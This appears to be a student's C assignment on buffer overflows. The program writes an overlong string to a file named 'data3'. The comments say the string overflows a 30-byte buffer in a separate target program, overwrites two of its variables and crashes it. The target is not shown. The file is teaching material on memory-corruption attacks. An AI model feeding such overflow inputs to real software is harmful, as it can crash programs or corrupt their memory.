/*------------------------------------------------------*/
/*              Name: Athanasios Ioannis                */
/*              Surname: Xanthopoylos                   */
/*              AM: 4702                                */
/*              Date: 12-05-2023                        */
/*              Assignment: 6                           */
/*                                                      */
/*           Buffer overflow attack and H4CK1NG         */
/*------------------------------------------------------*/
#include <stdlib.h>
#include <stdio.h>


/* This output fills the 30 bytes of the buffer and overflows,
thus overwriting the variables c and i. In var=i I give it an invalid value and the program crashes*/
int main(){
	/* Create a file  */
	FILE *file;

	/* Name it data3 and write in it */
	file = fopen("data3","w");

	/* Overflow the buffer and overwrite 'c' var and change i into an invalid value*/
	fputs("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa000",file);

	/* Don't forget to close the file */
	fclose(file);
	return 0;
}
